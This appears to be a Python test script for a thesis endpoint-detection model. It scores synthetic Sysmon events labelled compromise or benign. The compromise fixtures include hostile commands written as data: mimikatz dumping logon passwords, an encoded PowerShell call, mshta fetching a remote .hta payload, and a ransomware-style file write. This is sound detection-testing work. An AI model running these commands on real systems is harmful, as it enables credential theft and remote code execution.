"""Probe the honest (deduped, leak-features-dropped) model."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from model_loader import FrozenModel
from feature_row import build_feature_row

MODEL = Path("J:/THESIS-EDR/server/ml-engine/botsv2/models/lgbm_xt_stratified_vanilla_sysmon_honest")
m = FrozenModel(MODEL)
print(f"threshold={m.threshold:.3f}  n_features={len(m.feature_names)}\n")


def sysmon(host, eid, kvs):
    parts = [f"<Event><System><EventID>{eid}</EventID><Computer>{host}</Computer></System><EventData>"]
    for k, v in kvs.items():
        parts.append(f"<Data Name='{k}'>{v}</Data>")
    parts.append("</EventData></Event>")
    return "".join(parts)


def mk(host, eid, kvs, edge="WRITE", obj="FILE"):
    return {
        "raw_event": sysmon(host, eid, kvs),
        "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "edge_type": edge,
        "subject": {"node_type": "PROCESS"},
        "object": {"node_type": obj},
        "endpoint_id": host,
        "properties": {},
    }


cases = [
    ("COMPROMISE: powershell -enc (novel)",
     mk("alice-pc", 1, {"ProcessId": "8821",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": "powershell -enc SQBFAFgA",
        "User": r"CORP\alice"}, "FORK", "PROCESS")),
    ("COMPROMISE: mimikatz (novel)",
     mk("alice-pc", 1, {"ProcessId": "8822",
        "Image": r"C:\Tools\mimikatz.exe",
        "CommandLine": "mimikatz sekurlsa::logonpasswords"}, "FORK", "PROCESS")),
    ("COMPROMISE: .crypt write (novel)",
     mk("finance-pc", 11, {"ProcessId": "8824",
        "Image": r"C:\bad.exe", "CommandLine": "bad.exe",
        "TargetFilename": r"C:\Q3.xlsx.crypt"}, "WRITE")),
    ("COMPROMISE: winsys32.dll drop (novel)",
     mk("corp-laptop", 11, {"ProcessId": "8825",
        "Image": r"C:\Temp\invoice.exe",
        "TargetFilename": r"C:\Windows\System32\winsys32.dll"}, "WRITE")),
    ("COMPROMISE: mshta payload (novel)",
     mk("alice-pc", 1, {"ProcessId": "8823",
        "Image": r"C:\Windows\System32\mshta.exe",
        "CommandLine": "mshta http://x/p.hta"}, "FORK", "PROCESS")),
    ("BENIGN: Word .docx",
     mk("alice-pc", 11, {"ProcessId": "5000",
        "Image": r"C:\Office\WINWORD.EXE",
        "TargetFilename": r"C:\Users\alice\notes.docx"}, "WRITE")),
    ("BENIGN: notepad .txt",
     mk("alice-pc", 11, {"ProcessId": "5001",
        "Image": r"C:\Windows\System32\notepad.exe",
        "TargetFilename": r"C:\Users\alice\todo.txt"}, "WRITE")),
    ("BENIGN: SearchFilterHost",
     mk("alice-pc", 1, {"ProcessId": "5003",
        "Image": r"C:\Windows\System32\SearchFilterHost.exe",
        "CommandLine": "SearchFilterHost 0 512"}, "FORK", "PROCESS")),
    ("BENIGN: cmd dir",
     mk("alice-pc", 1, {"ProcessId": "5002",
        "Image": r"C:\Windows\System32\cmd.exe",
        "CommandLine": "cmd /c dir"}, "FORK", "PROCESS")),
    ("BENIGN: chrome renderer",
     mk("alice-pc", 1, {"ProcessId": "5004",
        "Image": r"C:\Chrome\chrome.exe",
        "CommandLine": "chrome --type=renderer"}, "FORK", "PROCESS")),
    ("BENIGN: svchost service",
     mk("alice-pc", 1, {"ProcessId": "5005",
        "Image": r"C:\Windows\System32\svchost.exe",
        "CommandLine": "svchost -k NetworkService -s Dnscache"}, "FORK", "PROCESS")),
]

print(f"{'case':<48} {'score':>8} {'verdict':>8}")
print("-" * 70)
for lbl, ev in cases:
    row, _ = build_feature_row(ev)
    s = m.predict_proba(row)
    v = "ALERT" if s >= m.threshold else "benign"
    print(f"{lbl:<48} {s:>8.4f} {v:>8}")
